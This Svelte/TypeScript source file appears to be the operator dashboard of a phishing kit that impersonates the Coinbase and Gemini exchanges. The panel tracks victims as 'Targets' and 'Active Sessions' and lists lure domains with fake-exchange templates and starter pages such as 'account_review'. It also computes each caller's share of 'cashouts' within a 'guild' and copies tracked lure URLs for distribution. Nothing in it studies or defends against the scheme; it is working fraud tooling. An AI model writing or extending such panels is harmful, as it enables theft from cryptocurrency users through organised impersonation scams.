<script lang="ts">
    import { onMount } from 'svelte';

    export let username: string;
    export let guild: string;
    import Coinbase from "$lib/images/coinbase-v2.svg"
    import Gemini from "$lib/images/gemini-dollar-gusd-logo.svg"

    import greenDot from "$lib/images/Green_dot.svg"
    import redDot from "$lib/images/Red_dot.svg"

    let Targets: Array<any> = [];
    let activePages: Array<any> = [];
    let earnings = 0;

    $: filteredTargets = Targets.filter(
        target => target.status === "Online" || target.status === "Waiting"
    );

    async function fetchDomains() {
        let starterpagemas = await fetch('/api/startingPage/get', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({ username })
        }).then(r => r.json()).then(data => data.starting_page || "account_review");

        try {
            const response = await fetch(`/api/guild/getDomains?guild=${guild}`);
            const domains = await response.json();
            
            activePages = domains.map((domain: any, index: number) => ({
                ID: index + 1,
                URL: domain.url,
                Template: domain.template || "Coinbase", 
                starterPage: starterpagemas
            }));
        } catch (error) {
            console.error('Error fetching domains:', error);
        }
    }

    function copyURL(URL: string) {
        let copyText = "https://" + URL + "/?id=" + btoa(username);
        navigator.clipboard.writeText(copyText);
        alert("Copied the URL: " + copyText);
    }

    onMount(async () => {
        await fetchDomains();
        const res = await fetch(`/ws-api/targets/${username}`);
        Targets = await res.json();

        const cashoutsResponse = await fetch(`/api/guild/getCallerCashouts?guild=${guild}&username=${username}`);
        const cashoutsData = await cashoutsResponse.json();
        
        if (cashoutsData.success) {
            earnings = cashoutsData.cashouts.reduce((sum: number, cashout: any) => 
                sum + (cashout.amount * (cashout.percentage_cut / 100)), 0);
        }
    });
</script>

<div class="overview">
    <div class="intro">
        <p>An overview of your performance.</p>
        <h1 class="white">Overview</h1>
    </div>
    <div class="performance">
        <div class="panelMetrics">
            <div class="box">
                <p>Logged in as</p>
                <h1 class="white">{username}</h1>
            </div>
            <div class="box">
                <p>Guild</p>
                <h1 class="white">{guild}</h1>
            </div>
        </div>
        <div class="earnings">
            <div class="box">
                <p><span class="material-icons">wifi</span> Connects</p>
                <h1 class="white">{Targets.length}</h1>
            </div>
            <div class="box">
                <p><span class="material-icons">play_circle</span> Active Sessions</p>
                <h1 class="white">{filteredTargets.length}</h1>
            </div>
            <div class="box">
                <p><span class="material-icons">attach_money</span> Earnings</p>
                <h1 class="white">${earnings.toFixed(2).replace(/\B(?=(\d{3})+(?!\d))/g, ",")}</h1>
            </div>
        </div>
        <table>   
            <thead>
                <tr>
                  <th>ID</th>
                  <th>URL</th>
                  <th>Template</th>
                  <th>Starter Page</th>
                  <th>Status</th>
                  <th>Actions</th>
                </tr>
            </thead>
            <tbody>
                {#each activePages as page}
                <tr>
                    <td>{page.ID}</td>
                    <td>{page.URL}</td>
                    {#if page.Template == "Coinbase"}
                    <td>
                        <div class="logoHolder">
                            <img src={Coinbase} height="15em" width="15em" alt="Coinbase Logo">
                            {page.Template}
                        </div>
                    </td>
                    {:else if page.Template == "Gemini"}
                    <td>
                        <div class="logoHolder">
                            <img src={Gemini} height="15em" width="15em" alt="Gemini Logo">
                            {page.Template}
                        </div>
                    </td>
                    {/if}
                    <td>./{page.starterPage}</td>
                    {#if page.Status == "Operational"}
                    <td>
                        <div class="logoHolder">
                            <img src={greenDot} height="15em" width="15em" alt="Online Status">
                            {page.Status}
                        </div>
                    </td>
                    {:else}
                    <td>
                        <div class="logoHolder">
                            <img src={redDot} height="15em" width="15em" alt="Offline Status">
                            {page.Status}
                        </div>
                    </td>
                    {/if}
                    <td>
                        <button on:click={() => copyURL(page.URL)}>Copy URL</button>
                    </td>       
                </tr>
                {/each}
            </tbody>
        </table>
    </div>
</div>

<style>
    .box p {
        display: flex;
        align-items: center;
        gap: 0.3em;
    }
    
    .logoHolder {
        display: flex;
        align-items: center;
        gap: 0.5em;
    }

    table {
        text-align: left;
        padding: 2em;
        border: 1px solid #39A04D;
        background: #1a1a1a;
        border-radius: 1em;
    }

    th {
        font-weight: normal;
        color: #888;
    }

    tbody {
        color: #4CF485;
    }

    .performance {
        display: flex;
        flex-direction: column;
        gap: 1em;
    }

    .earnings {
        display: flex;
        gap: 1em;
    }

    .box {
        padding: 1.5em;
        border: 1px solid #39A04D;
        background: #1a1a1a;
        border-radius: 1em;
    }

    .earnings .box {
        width: 20em;
    }

    .intro {
        padding-bottom: 1em;
        border-bottom: 1px solid #39A04D;
        margin-bottom: 2em;
    }

.panelMetrics {
    display: flex;
    gap: 1em;
    margin-bottom: 1em;
}

.panelMetrics .box {
    flex: 1;
    background: #1a1a1a;
    border: 1px solid #39A04D;
    transition: all 0.3s ease;
}

.panelMetrics .box:hover {
    transform: translateY(-5px);
    box-shadow: 0 5px 15px rgba(76, 244, 133, 0.2);
    border: 1px solid #4CF485;
}

.panelMetrics p {
    color: #8b8b8b;
    font-size: 0.9em;
    margin-bottom: 0.5em;
}

.panelMetrics h1 {
    font-size: 1.5em;
    margin: 0;
}

.earnings {
    display: flex;
    gap: 1em;
    margin-bottom: 2em;
}

.earnings .box {
    flex: 1;
    background: #1a1a1a;
    border: 1px solid #39A04D;
    transition: all 0.3s ease;
    padding: 1.5em;
    border-radius: 1em;
}

.earnings .box:hover {
    transform: translateY(-5px);
    box-shadow: 0 5px 15px rgba(76, 244, 133, 0.2);
    border: 1px solid #4CF485;
}

.earnings p {
    display: flex;
    align-items: center;
    gap: 0.5em;
    color: #8b8b8b;
    font-size: 0.9em;
    margin-bottom: 0.5em;
}

.earnings h1 {
    font-size: 2em;
    margin: 0;
}

.material-icons {
    color: #4CF485;
}

.white {
    color: #4CF485;
}

/* Enhance table styling */
table {
    width: 100%;
    border-collapse: separate;
    border-spacing: 0;
    background: #1a1a1a;
    border: 1px solid #39A04D;
    border-radius: 1em;
    overflow: hidden;
}

th {
    padding: 1em;
    background: rgba(76, 244, 133, 0.1);
    color: #8b8b8b;
    font-weight: normal;
    text-transform: uppercase;
    font-size: 0.8em;
    letter-spacing: 0.1em;
}

td {
    padding: 1em;
    border-top: 1px solid #39A04D;
}

tr:hover {
    background: rgba(76, 244, 133, 0.1);
}

button {
    background: #39A04D;
    border: 1px solid #4CF485;
    color: #32322C;
    padding: 0.5em 1em;
    border-radius: 0.5em;
    cursor: pointer;
    transition: all 0.3s ease;
}

button:hover {
    background: #4CF485;
    transform: translateY(-2px);
}
</style>
